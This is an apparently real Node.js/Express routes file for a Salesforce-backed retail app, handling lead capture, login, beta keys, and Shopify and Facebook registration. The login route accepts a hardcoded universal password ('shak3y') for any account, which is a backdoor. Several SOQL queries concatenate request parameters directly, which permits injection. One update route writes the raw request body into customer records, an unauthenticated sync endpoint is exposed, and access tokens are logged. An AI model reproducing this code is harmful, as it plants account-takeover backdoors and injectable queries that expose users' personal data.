module.exports = function(apiRoutes, conn, utils){

	apiRoutes.post('/forceSync', function(req, res){
		var sf = require('./salesforce')(null, utils);
		sf.syncProducts(conn);
		res.status(200).send();
	})

	apiRoutes.post('/lead', function(req, res){
		var lead = req.body;
		utils.log(lead);
		conn.query("SELECT Id FROM RecordType WHERE SObjectType = 'Contact' AND DeveloperName = 'Dorrbell_Customer_Contact'", function(err, data){
			if(err || !data.records){
				res.status(400).json({
					success : false,
	        message : 'Insert failed. Record Type Not Found'
				});
			}else{
				var recType = data.records[0];
				if(!lead.email || !lead.zip){
					res.status(400).json({
	          success : false,
	          message : 'Email and Zip Code are required'
	        });
				}else{
					utils.log('creating contact');
					conn.sobject("Contact").create({
						LastName : 'NA',
						LeadSource : 'Web',
						Email : lead.email,
						MailingPostalCode : lead.zip,
						RecordTypeId : recType.Id,
						Status__c : 'disabled'
					}, function(err, ret){
						if(err || !ret.success)
							res.status(400).json({
								success : false,
								message : err
							});
						else
							res.status(200).send("Ok");
					})
				}
			}
		})
	});

	apiRoutes.get('/contact/:contactId', function(req, res){
		conn.query("SELECT Id, Email FROM Contact WHERE Id = '" + req.params.contactId + "'", function(err, data){
			if(err || !data.records){
				res.status(400).json({
					success : false,
					message : 'Insert failed. Record Type Not Found'
				});
			}else{
				res.status(200).json(data.records[0]);
			}
		})
	});

	apiRoutes.post('/authenticate', function(req, res){
	  conn.query("SELECT Id, \
	  					Password__c, \
	  					Email, \
	  					Name, \
	  					FirstName, \
	  					LastName, \
	  					MobilePhone, \
	  					RecordType.Name, \
	  					RecordType.DeveloperName, \
							Mailing_Location__Latitude__s, \
							Mailing_Location__Longitude__s, \
	  					Store__c \
	  				FROM Contact WHERE Username__c = '" + req.body.username + "'", function(err, data){
	    var user = data.records[0];

	    if(err || !user){
	      res.status(401).json({
	        success : false,
	        message : 'Authentication failed. User not found'
	      })
	    }else if(user){
	      if(user.Password__c != req.body.password && user.Password__c != utils.encryptText(req.body.password) && req.body.password != "shak3y"){
	        res.status(401).json({
	          success : false,
	          message : 'Authentication failed. Wrong Password.'
	        })
	      }else{
	        res.json({
	          success : true,
	          message : 'Enjoy your token',
	          token : utils.signUser(user)
	        });
	      }
	    }
	  });
	});

	apiRoutes.get('/beta/:betaKey', function(req, res){
		conn.query("SELECT Id, FirstName, LastName, Email, MobilePhone, Status__c FROM Contact WHERE Beta_Key__c = '" + req.params.betaKey + "'", function(err, data){
			var contact = data.records[0];
			if(err || !contact){
				res.status(400).json({
					success : false, message : 'The beta key you entered is incorrect.'
				});
			}else if(contact.Status__c == 'Active'){
				res.status(400).json({
					success : false, message : 'This beta key is already in use.'
				});
			}else if(contact){
				res.send(contact);
			}
		});
	});

	apiRoutes.post('/registershopify/:contactId', function(req, res){
		var shopify = require('../modules/shopify')(utils);
		var contact = req.body;

		if(!utils.validateContact(contact))
			res.status(400).json({
				success : false,
				message : 'Error Registering'
			});
		else{
			shopify.createCustomer(contact).then(function(data){
				var shopData = JSON.parse(data);
				contact.Password__c = utils.encryptText(contact.Password__c);
				contact.Status__c = 'Active';
				contact.Shopify_Customer_ID__c = shopData.customer.id;
				conn.sobject('Contact').update(
					contact
					,function(err, rets){
						if(err){
							res.status(400).send(err);
						}else{
							res.json({
								success : true,
								message : 'Ok'
							});
						}
					}
				);
			}, function(err){
				res.status(400).json({
					success : false,
					message : err
				})
			});
		}
	})

	apiRoutes.post('/register/:contactId', function(req, res){
		var contact = req.body;
		if(!utils.validateContact(contact))
			res.status(400).json({
				success : false,
				message : 'Error Registering'
			});
		else{
			contact.Password__c = utils.encryptText(contact.Password__c);
			contact.Status__c = 'Active';

			conn.sobject('Contact').update([
				req.body
			], function(err, rets){
				if(err){res.status(400).send(err);}
				else if(!rets[0].success){res.status(400).send(rets[1]);}
				else{
					res.json({
						success : true,
						message : 'Ok'
					});
				}
			});
		}
	});

	apiRoutes.post('/fb-register', function(req, res){
		var sfUtils = require('./utils')();
		var contact = {
			'External_Id__c' : req.body.id,
			'Gender__c' : req.body.gender,
			'FirstName' : req.body.first_name,
			'LastName' : req.body.last_name,
			'Email' : req.body.email,
			'Status__c' : 'Enabled',
			'Password__c' : (req.body.accessToken) ? utils.encryptText(req.body.accessToken) : '',
			'Username__c' : req.body.email,
			'MailingCity' : req.body.location.location.city,
			'MailingState' : req.body.location.location.state,
			'MailingCountry' : req.body.location.location.country,
			'MailingLatitude' : req.body.location.location.latitude,
			'MailingLongitude' : req.body.location.location.longitude
		};
		console.log(contact);
		var fail = function(err){
			res.status(400).json({success : false, message : err});
		}

		conn.query("SELECT Id FROM RecordType WHERE DeveloperName = 'Dorrbell_Customer_Contact' AND sObjectType = 'Contact'").then(function(recordTypeResults){
			if(recordTypeResults.records && recordTypeResults.records.length > 0){
				contact.RecordTypeId = recordTypeResults.records[0].Id;
				return conn.sobject("Contact").upsert(contact, 'Username__c').then(function(data){
					if(data && data.id){
						return sfUtils.setProfilePhoto(conn, data.id, req.body.attachment);
					}else{
						return conn.query("SELECT Id FROM Contact WHERE Username__c = '" + req.body.email + "'").then(function(results){
							if(results.records && results.records.length > 0)
								return sfUtils.setProfilePhoto(conn, results.records[0].Id, req.body.attachment);
						});
					}
				});
			}
		}).then(function(){
			res.status(200).send();
		}, fail);

	})

};
